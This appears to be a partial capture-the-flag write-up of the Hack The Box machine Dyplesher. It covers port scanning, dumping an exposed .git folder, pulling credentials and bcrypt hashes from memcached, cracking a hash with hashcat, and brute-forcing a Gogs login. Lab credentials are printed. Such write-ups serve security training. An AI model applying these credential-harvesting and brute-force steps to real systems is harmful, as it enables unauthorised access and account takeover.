---
description: >-
  Zweilosec's write-up of the Insane difficulty Linux machine from
  https://hackthebox.eu
---

# HTB - Dyplesher

## Overview

![](../../.gitbook/assets/0-dyplesher-infocard.png)

Dyplesher was an insane difficulty Linux machine that tested both web enumeration skills, and code review and writing skills. Multiple Git repositories containing source code, the Memcache service, and a Minecraft server were all exploited to gain access to this machine.  I learned quite a bit about the inner workings of a Minecraft server and how their plugins work during the course of this challenge!

## Useful Skills and Tools

### Recreating a git repository from a GitLab export .bundle file

Gitlab exports a tar.gz archive which contains .bundle files for each project. You can convert these files into a normal git repository using the following steps:

* From releases page download the export archive containing .bundle files
* Extract each .bundle file

  ```text
  $ tar xvfz GitLabExport.tar.gz
  x ./
  x ./project.bundle
  x ./project.json
  x ./VERSION
  ```

* Restore the .bundle to a git repository
  * Make a new directory and clone the repository into it
  * ```text
    $ mkdir repo
    $ git clone --mirror project.bundle repo/.git
    ```
  * Change directories to repository folder, then initialize and checkout the repository
  * ```text
    $ cd repo
    $ git init
    Reinitialized existing Git repository in repo/.git/
    $ git checkout
    ```
* Check the contents of your restored repository

  ```text
  $ git status
  On branch master
  nothing to commit, working tree clean
  $ ls
  README.md
  code.py
  ```

Initial credit to [https://gist.github.com/maxivak/513191447d15c4d30953006d99928658](https://gist.github.com/maxivak/513191447d15c4d30953006d99928658). [https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7](https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7) for updated instructions to recreate repository

#### Useful thing 2

* description with generic example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.190`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ nmap -n -v -sCV -p- 10.10.10.190 -oA dyplesher
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 20:41 EDT
snipped...
Nmap scan report for 10.10.10.190
Host is up (0.035s latency).
Not shown: 65525 filtered ports
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)
|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)
80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyplesher
3000/tcp  open   ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=6e79c6a13e2c9cab; Path=/; HttpOnly
|     Set-Cookie: _csrf=bKAuEsuS8JUrgaQ9cz8CAbxVxz46MTYwMTk0NTM2NTAxNDgzNzE1NQ%3D%3D; Path=/; Expires=Wed, 07 Oct 2020 00:49:25 GMT; HttpOnly
|     Date: Tue, 06 Oct 2020 00:49:25 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="bKAuEsuS8JUrgaQ9cz8CAbxVxz46MTYwMTk0NTM2NTAxNDgzNzE1NQ==" />
|     <meta name="_suburl" content="" />
|     <meta proper
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=89a8180fe6b7d340; Path=/; HttpOnly
|     Set-Cookie: _csrf=E2-EV8F1D9ah1A6HZrc1P3nsEOo6MTYwMTk0NTM3MDIyODY2ODE4Mg%3D%3D; Path=/; Expires=Wed, 07 Oct 2020 00:49:30 GMT; HttpOnly
|     Date: Tue, 06 Oct 2020 00:49:30 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="E2-EV8F1D9ah1A6HZrc1P3nsEOo6MTYwMTk0NTM3MDIyODY2ODE4Mg==" />
|     <meta name="_suburl" content="" />
|_    <meta
4369/tcp  open   epmd       Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
5672/tcp  open   amqp       RabbitMQ 3.7.8 (0-9)
| amqp-info: 
|   capabilities: 
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@dyplesher
|   copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.
|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
|   platform: Erlang/OTP 22.0.7
|   product: RabbitMQ
|   version: 3.7.8
|   mechanisms: PLAIN AMQPLAIN
|_  locales: en_US
11211/tcp open   memcache?
25562/tcp open   unknown
25565/tcp open   minecraft?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns: 
|     '{"text":"Unsupported protocol version"}
|   NotesRPC: 
|     q{"text":"Unsupported protocol version 0, please use one of these versions:
|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x"}
25572/tcp closed unknown
25672/tcp open   unknown
snipped...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 283.61 seconds
```

This scan showed that there were lots of ports open.  The table below shows the information that I pulled out that seemed the most relevant. 

<table>
  <thead>
    <tr>
      <th style="text-align:left">Port</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">22</td>
      <td style="text-align:left"><b>OpenSSH 8.0p1</b> Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</td>
    </tr>
    <tr>
      <td style="text-align:left">80</td>
      <td style="text-align:left">
        <p><b>Apache httpd 2.4.41</b> ((Ubuntu))</p>
        <p>http-title: Dyplesher</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">3000</td>
      <td style="text-align:left">&quot;<b>Gogs</b> is a painless self-hosted <b>Git</b> service&quot;</td>
    </tr>
    <tr>
      <td style="text-align:left">4369</td>
      <td style="text-align:left">
        <p>Erlang Port Mapper Daemon</p>
        <p>nodes: <b>rabbit: 25672</b>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">5672</td>
      <td style="text-align:left">
        <p>amqp <b>RabbitMQ 3.7.8</b> (0-9)</p>
        <p>See http://www.rabbitmq.com/</p>
        <p>| platform: <b>Erlang/OTP 22.0.7</b>
        </p>
        <p>| product: RabbitMQ</p>
        <p>| version: <b>3.7.8</b>
        </p>
        <p>| mechanisms: <b>PLAIN AMQPLAIN</b>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">11211</td>
      <td style="text-align:left"><b>memcached</b> default port</td>
    </tr>
    <tr>
      <td style="text-align:left">25565</td>
      <td style="text-align:left"><b>Minecraft</b> default port</td>
    </tr>
    <tr>
      <td style="text-align:left">25672</td>
      <td style="text-align:left">Erlang Port Mapper above reveals this to be <b>RabbitMQ</b> related</td>
    </tr>
  </tbody>
</table>

There were also two unknown ports: 25562 and 25572.  I was quite curious about the Erlang Port Mapper and RabbitMQ since I had never dealt with those before, but I decided to enumerate the HTTP service on port 80 first.

### Port 80 - HTTP

![](../../.gitbook/assets/1-dyplesher-minecraft.png)

On port 80 there was a Minecraft server hosted called the "Worst Minecraft Server".  There was not much information on the page itself, other than a virtual host notated at `test.dyplesher.htb`, which I added to my hosts file and navigated to.  

![](../../.gitbook/assets/4-test-page.png)

At `test.dyplesher.htb` there was a page where I could enter a key/value pair which would be inserted into the local memcache, and the page would tell me whether the key and value were equal to each other. After playing around with adding different pairs I decided to move on.   

![](../../.gitbook/assets/2-staff.png)

I found a link to the website staff, which led to a page with 3 potential users.  There was a link under each username which pointed to `http://dyplesher.htb:8080/`.  I added `dyplesher.htb` to my hosts file and tried to navigate to the first one `http://dyplesher.htb:8080/arrexel` but port 8080 was not open. 

![](../../.gitbook/assets/2-appjs.png)

In the source code of the page I found an `app.js`; at the bottom of the code found a path `C:\Users\felamos\Documents\tekkro\resources\js\app.js` which looks like a Windows path _\(I thought this was a linux machine?\)_  _I figured that this pointed towards this machine requiring cross-compilation of code later on._  The path also referenced the username `felamos` which I had seen earlier. It looks like this may be the site's developer.

![](../../.gitbook/assets/3-tekkit-minecraft.png)

Searching for `tekkro` led to [https://tekkitserverlist.com/server/0fOnRygu/tekkro-tekkit-classic](https://tekkitserverlist.com/server/0fOnRygu/tekkro-tekkit-classic), which refers to a mod pack for Minecraft called `Tekkit Classic` which seems to possibly be quite outdated since it was last updated in May of 2018. 

[https://tekkitclassic.fandom.com/wiki/The\_Tekkit\_Wiki](https://tekkitclassic.fandom.com/wiki/The_Tekkit_Wiki)

> Created by the Technic team, Tekkit Classic is a modpack for the record breaking sandbox construction game Minecraft. It brings together some of the best mods from the Minecraft community for automating, industrializing and powering your worlds and bundles them into one easy download!
>
> Tekkit Classic runs on a base of Minecraft 1.2.5 and has Bukkit inbuilt, so the full range of Bukkit Pluggins are available for server owners.

This potentially reveals the version of this Minecraft server as 1.2.5. 

### The .git repository

![](../../.gitbook/assets/5-git-dirbuster.png)

While scanning with dirbuster, I found a `.git` folder.  Browsing to this folder resulted in getting denied, so next I tried using `git-dumper.py` like I did in the Hack the Box machine [`Travel`](../hard/travel-write-up.md).

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ ~/.local/bin/git-dumper/git-dumper.py http://test.dyplesher.htb/.git/ gitdump                   1 ⨯
[-] Testing http://test.dyplesher.htb/.git/HEAD [200]
[-] Testing http://test.dyplesher.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://test.dyplesher.htb/.gitignore [404]
[-] Fetching http://test.dyplesher.htb/.git/description [200]
[-] Fetching http://test.dyplesher.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/update.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/index [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://test.dyplesher.htb/.git/hooks/post-receive.sample [404]
[-] Fetching http://test.dyplesher.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://test.dyplesher.htb/.git/info/exclude [200]
[-] Fetching http://test.dyplesher.htb/.git/objects/info/packs [404]
[-] Finding refs/
[-] Fetching http://test.dyplesher.htb/.git/HEAD [200]
[-] Fetching http://test.dyplesher.htb/.git/ORIG_HEAD [404]
[-] Fetching http://test.dyplesher.htb/.git/FETCH_HEAD [404]
[-] Fetching http://test.dyplesher.htb/.git/config [200]
[-] Fetching http://test.dyplesher.htb/.git/logs/HEAD [200]
[-] Fetching http://test.dyplesher.htb/.git/info/refs [404]
[-] Fetching http://test.dyplesher.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] Fetching http://test.dyplesher.htb/.git/logs/refs/remotes/origin/master [200]
[-] Fetching http://test.dyplesher.htb/.git/packed-refs [404]
[-] Fetching http://test.dyplesher.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://test.dyplesher.htb/.git/refs/heads/master [200]
[-] Fetching http://test.dyplesher.htb/.git/logs/refs/stash [404]
[-] Fetching http://test.dyplesher.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://test.dyplesher.htb/.git/refs/remotes/origin/master [200]
[-] Fetching http://test.dyplesher.htb/.git/refs/stash [404]
[-] Fetching http://test.dyplesher.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] Fetching http://test.dyplesher.htb/.git/refs/wip/index/refs/heads/master [404]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://test.dyplesher.htb/.git/objects/b1/fe9eddcdf073dc45bb406d47cde1704f222388 [200]
[-] Fetching http://test.dyplesher.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching http://test.dyplesher.htb/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200]
[-] Fetching http://test.dyplesher.htb/.git/objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0 [200]
[-] Fetching http://test.dyplesher.htb/.git/objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433 [200]
[-] Running git checkout .

┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ cd gitdump        

┌──(zweilos㉿kali)-[~/htb/dyplesher/gitdump]
└─$ ls -la         
total 16
drwxr-xr-x 3 zweilos zweilos 4096 Oct 10 16:08 .
drwxr-xr-x 5 zweilos zweilos 4096 Oct 10 16:08 ..
drwxr-xr-x 7 zweilos zweilos 4096 Oct 10 16:08 .git
-rw-r--r-- 1 zweilos zweilos  513 Oct 10 16:08 index.php
-rw-r--r-- 1 zweilos zweilos    0 Oct 10 16:08 README.md
```

Using `git-dumper.py` I was able to dump the contents of the git repository, and started searching through the source code.

![](../../.gitbook/assets/5-git-index.png)

In the file `index.php` there were credentials for `felamos:zxcvbnm` and access information for a memcached server.   I did some research to see if there was a way to access this remotely and found [https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line](https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line), which describes how to access memcache through the command line.

_This is source code for the page I saw hosted at `test.dyplesher.htb`, and it did exactly what I thought._

### Enumerating memcached

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ telnet 10.10.10.190 11211
Trying 10.10.10.190...
Connected to 10.10.10.190.
Escape character is '^]'.
stats
stats slabs
stats items
Connection closed by foreign host.
```

Unfortunately telnet did not work as described in the article. Next I tried a tool I found on GitHub called `memclient` from [https://github.com/jorisroovers/memclient](https://github.com/jorisroovers/memclient).  

```text
ping -c 2 10.10.10.190
echo "list" | nc 10.10.10.190 11211
memclient --host 10.10.10.190 --port 11211 list
chmod +x memclient
./memclient --host 10.10.10.190 --port 11211 list
./memclient --host felamos:zxcvbnm@dyplesher.htb --port 11211 list
./memclient --host dyplesher.htb --port 11211 list
./memclient --help
Usage: memclient [OPTIONS] COMMAND [arg...]

Simple command-line client for Memcached

Options:
  -v, --version=false      Show the version and exit
  --host, -h="localhost"   Memcached host (or IP)
  --port, -p="11211"       Memcached port

Commands:
  set          Sets a key value pair
  get          Retrieves a key
  delete       Deletes a key
  flush        Flush all cache keys (they will still show in 'list', but will return 'NOT FOUND')
  version      Show server version
  list         Lists all keys
  stats        Print server statistics
  stat         Print a specific server statistic

Run 'memclient COMMAND --help' for more information on a command.
```

The `memclient` tool also failed to work properly because I was unable to figure out how to send credentials with my connection.  _\(among other random tests! For some reason I forgot to save this output, but I found these commands in my .history file\)_

I tried one last tool from GitHub called `bmemcached-cli` from [https://github.com/RedisLabs/bmemcached-cli](https://github.com/RedisLabs/bmemcached-cli) since it supported remote login.  Unfortunately this `bmemcached-cli` tool was written in python2 so I had to go through and fix it up so it ran in python3...but after fixing it up it ran just fine and connected me to the memcached server using the credentials I found.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher/bmemcached-cli]
└─$ bmemcached-cli felamos:zxcvbnm@dyplesher.htb:11211                        
Connecting to felamos:zxcvbnm@dyplesher.htb:11211
([B]memcached) help

Documented commands (type help <topic>):
========================================
add   delete              flush_all  help     replace      stats    
cas   disconnect_all      get        incr     set          unpickler
decr  enable_retry_delay  gets       pickler  set_servers

Undocumented commands:
======================
EOF  delete_multi  exit
```

I did some research on enumerating memcached and found two useful sites: 

* [https://amriunix.com/post/memcached-enumeration/](https://amriunix.com/post/memcached-enumeration/)
* [https://lzone.de/cheat-sheet/memcached](https://lzone.de/cheat-sheet/memcached)

Using this information I began enumerating the memcached service.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher/bmemcached-cli]
└─$ bmemcached-cli felamos:zxcvbnm@dyplesher.htb:11211
Connecting to felamos:zxcvbnm@dyplesher.htb:11211
([B]memcached) stats
{'dyplesher.htb:11211': {'accepting_conns': b'1',
                         'auth_cmds': b'2041',
                         'auth_errors': b'0',
                         'bytes': b'708',
                         'bytes_read': b'633180',
                         'bytes_written': b'300700',
                         'cas_badval': b'0',
                         'cas_hits': b'0',
                         'cas_misses': b'0',
                         'cmd_flush': b'647',
                         'cmd_get': b'746',
                         'cmd_meta': b'0',
                         'cmd_set': b'2588',
                         'cmd_touch': b'0',
                         'conn_yields': b'0',
                         'connection_structures': b'4',
                         'crawler_items_checked': b'140',
                         'crawler_reclaimed': b'0',
                         'curr_connections': b'3',
                         'curr_items': b'4',
                         'decr_hits': b'0',
                         'decr_misses': b'0',
                         'delete_hits': b'0',
                         'delete_misses': b'0',
                         'direct_reclaims': b'0',
                         'evicted_active': b'0',
                         'evicted_unfetched': b'0',
                         'evictions': b'0',
                         'expired_unfetched': b'15',
                         'get_expired': b'0',
                         'get_flushed': b'2568',
                         'get_hits': b'8',
                         'get_misses': b'738',
                         'hash_bytes': b'524288',
                         'hash_is_expanding': b'0',
                         'hash_power_level': b'16',
                         'incr_hits': b'0',
                         'incr_misses': b'0',
                         'libevent': b'2.1.8-stable',
                         'limit_maxbytes': b'67108864',
                         'listen_disabled_num': b'0',
                         'log_watcher_sent': b'0',
                         'log_watcher_skipped': b'0',
                         'log_worker_dropped': b'0',
                         'log_worker_written': b'0',
                         'lru_bumps_dropped': b'0',
                         'lru_crawler_running': b'0',
                         'lru_crawler_starts': b'9180',
                         'lru_maintainer_juggles': b'78903',
                         'lrutail_reflocked': b'0',
                         'malloc_fails': b'0',
                         'max_connections': b'1024',
                         'moves_to_cold': b'2588',
                         'moves_to_warm': b'0',
                         'moves_within_lru': b'0',
                         'pid': b'1',
                         'pointer_size': b'64',
                         'read_buf_bytes': b'65536',
                         'read_buf_bytes_free': b'49152',
                         'read_buf_oom': b'0',
                         'reclaimed': b'16',
                         'rejected_connections': b'0',
                         'reserved_fds': b'20',
                         'response_obj_bytes': b'4672',
                         'response_obj_free': b'3',
                         'response_obj_oom': b'0',
                         'response_obj_total': b'4',
                         'rusage_system': b'3.913020',
                         'rusage_user': b'5.978833',
                         'slab_global_page_pool': b'0',
                         'slab_reassign_busy_deletes': b'0',
                         'slab_reassign_busy_items': b'0',
                         'slab_reassign_chunk_rescues': b'0',
                         'slab_reassign_evictions_nomem': b'0',
                         'slab_reassign_inline_reclaim': b'0',
                         'slab_reassign_rescues': b'0',
                         'slab_reassign_running': b'0',
                         'slabs_moved': b'0',
                         'threads': b'4',
                         'time': b'1603656896',
                         'time_in_listen_disabled_us': b'0',
                         'total_connections': b'2047',
                         'total_items': b'2588',
                         'touch_hits': b'0',
                         'touch_misses': b'0',
                         'uptime': b'38819',
                         'version': b'1.6.5'}}
```

It seems like there are a lot of items stored in this service \(2588\).

```text
([B]memcached) stats slabs
{'dyplesher.htb:11211': {'1:cas_badval': b'0',
                         '1:cas_hits': b'0',
                         '1:chunk_size': b'96',
                         '1:chunks_per_page': b'10922',
                         '1:cmd_set': b'132',
                         '1:decr_hits': b'0',
                         '1:delete_hits': b'0',
                         '1:free_chunks': b'10921',
                         '1:free_chunks_end': b'0',
                         '1:get_hits': b'0',
                         '1:incr_hits': b'0',
                         '1:total_chunks': b'10922',
                         '1:total_pages': b'1',
                         '1:touch_hits': b'0',
                         '1:used_chunks': b'1',
                         '3:cas_badval': b'0',
                         '3:cas_hits': b'0',
                         '3:chunk_size': b'152',
                         '3:chunks_per_page': b'6898',
                         '3:cmd_set': b'132',
                         '3:decr_hits': b'0',
                         '3:delete_hits': b'0',
                         '3:free_chunks': b'6897',
                         '3:free_chunks_end': b'0',
                         '3:get_hits': b'0',
                         '3:incr_hits': b'0',
                         '3:total_chunks': b'6898',
                         '3:total_pages': b'1',
                         '3:touch_hits': b'0',
                         '3:used_chunks': b'1',
                         '5:cas_badval': b'0',
                         '5:cas_hits': b'0',
                         '5:chunk_size': b'240',
                         '5:chunks_per_page': b'4369',
                         '5:cmd_set': b'132',
                         '5:decr_hits': b'0',
                         '5:delete_hits': b'0',
                         '5:free_chunks': b'4368',
                         '5:free_chunks_end': b'0',
                         '5:get_hits': b'0',
                         '5:incr_hits': b'0',
                         '5:total_chunks': b'4369',
                         '5:total_pages': b'1',
                         '5:touch_hits': b'0',
                         '5:used_chunks': b'1',
                         '6:cas_badval': b'0',
                         '6:cas_hits': b'0',
                         '6:chunk_size': b'304',
                         '6:chunks_per_page': b'3449',
                         '6:cmd_set': b'132',
                         '6:decr_hits': b'0',
                         '6:delete_hits': b'0',
                         '6:free_chunks': b'3448',
                         '6:free_chunks_end': b'0',
                         '6:get_hits': b'0',
                         '6:incr_hits': b'0',
                         '6:total_chunks': b'3449',
                         '6:total_pages': b'1',
                         '6:touch_hits': b'0',
                         '6:used_chunks': b'1',
                         'active_slabs': b'4',
                         'total_malloced': b'4194304'}}
([B]memcached) stats cachedump 1 1000
Traceback (most recent call last):
  File "/home/zweilos/.local/lib/python3.8/site-packages/bmemcachedcli/main.py", line 79, in handler
    pprint.pprint(getattr(self.memcache, name)(*parts))
TypeError: stats() takes from 1 to 2 positional arguments but 4 were given
```

There were four active slabs, however the command `stats cachedump` caused the program to crash, and I didn't find much that looked useful using the other methods I knew, so I tried to guess possible keys.  

```text
([B]memcached) get users
None
([B]memcached) get usernames
None
([B]memcached) get username
'MinatoTW\nfelamos\nyuntao\n'
([B]memcached) get password
('$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa\n'
 '$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK\n'
 '$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS\n')
([B]memcached)
```

I got some results back when trying to get values for the keys 'username' and 'password'.  I was able to collect three usernames and three password hashes.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ hashcat --help | grep -i bcrypt                                                           
3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
```

I identified the hashes as bcrypt by the `$2a$` before the salt and used hashcat's help to get the right hashtype code. Next I fired up hashcat to attempt to crack the hashes using `rockyou.txt`.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ hashcat -O -D1,2 -a0 -m3200 hashes /usr/share/wordlists/rockyou.txt                              
hashcat (v6.1.1) starting...

Hashfile 'hashes' on line 3 ($2a$10...GefnAH3zipl.FRNySz5C4RjitiwUoalS): Token length exception
Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK:mommy1
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: hashes
Time.Started.....: Sat Oct 10 18:16:31 2020 (1 min, 14 secs)
Time.Estimated...: Tue Oct 13 04:59:53 2020 (2 days, 10 hours)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       68 H/s (11.25ms) @ Accel:8 Loops:32 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 9024/28688770 (0.03%)
Rejected.........: 0/9024 (0.00%)
Restore.Point....: 4512/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:320-352
Candidates.#1....: joselyn -> joselito
```

One of the password hashes was cracked fairly quickly, however only two of the hashes were recognized by hashcat \(one seemed to be the wrong length\). `mommy1` was the password.

### Port 3000 - the Gogs git service

I tried logging into SSH and the login page on the `dyplesher.htb` site with this password and the four usernames I found but I had no luck there.

![](../../.gitbook/assets/6-gogs.png)

Looking back at the nmap report, I saw that port 3000 was running another HTTP service hosting `Gogs`.  Searching for Gogs and git led to [https://gogs.io/](https://gogs.io/), which gave me some information about this self-hosted git service.  I navigated to the local Gogs repo page to check it out.

![](../../.gitbook/assets/8-register.png)

I created an account to see what would happen, but then went back and tried to see if I already had credentials for an active account.

![](../../.gitbook/assets/8-felamos-gogs.png)

I used burp intruder to brute force the login page with the usernames and passwords I had collected.  The username `felamos` and the password `mommy1` logged me in to a dashboard where I could see that `felamos` had created two git repositories.  

![](../../.gitbook/assets/9-test.png)

I noted the email addresses on the `/explore/users` page _\(and my test account!\)_.

![](../../.gitbook/assets/8-felamos-profile.png)

There was nothing of use in any of the profile pages.  I got hopeful when I saw the SSH keys page, but there wasn't anything there.

![](../../.gitbook/assets/8-felamos-index.png)

I found a git repository with the code for the memcached page were I got the credentials for `felamos`. This looks to be the repository I retrieved earlier with `gitdump.py`.

![](../../.gitbook/assets/10-gitlab-backup.png)

l also found backup of a gitlab page, but there was only a basic `README.md` file. 

![](../../.gitbook/assets/11-gitlab-releases.png)

The `/releases` page for the gitlab repo held a few downloads.  The Source code links just contained a `README.md` with no useful information, however the `repo.zip` was more interesting.

### Recreating a git repository from a .bundle file

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ tree repositories    
repositories
└── @hashed
    ├── 4b
    │   └── 22
    │       └── 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
    ├── 4e
    │   └── 07
    │       └── 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
    ├── 6b
    │   └── 86
    │       └── 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
    └── d4
        └── 73
            └── d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
```

I downloaded and extracted `repo.zip` and found that it contained a `repositories` folder which had several .bundle files in nested folders.

I did some research on gitlab .bundle files and found [https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7](https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7) which contained instructions on how to recreate a git repository from these files.

```text
┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4b/22]
└─$ git clone --mirror 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle ./repo/.git
Cloning into bare repository './repo/.git'...
Receiving objects: 100% (39/39), 10.46 KiB | 10.46 MiB/s, done.
Resolving deltas: 100% (12/12), done.

┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4b/22]
└─$ cd repo 

┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
└─$ git init
Reinitialized existing Git repository in /home/zweilos/htb/dyplesher/repositories/@hashed/4b/22/repo/.git/

┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
└─$ git checkout

┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
└─$ git status  
On branch master
nothing to commit, working tree clean

┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
└─$ ls
LICENSE  README.md  src
```

I followed the instructions and was able to successfully recreate the git repository for the first .bundle file.

![](../../.gitbook/assets/12-vote-listener.png)

The first .bundle file turned into a repo for `votelistener.py` which seemed to be a plugin for taking in-game user votes.

![](../../.gitbook/assets/12-vote-listenerpy.png)
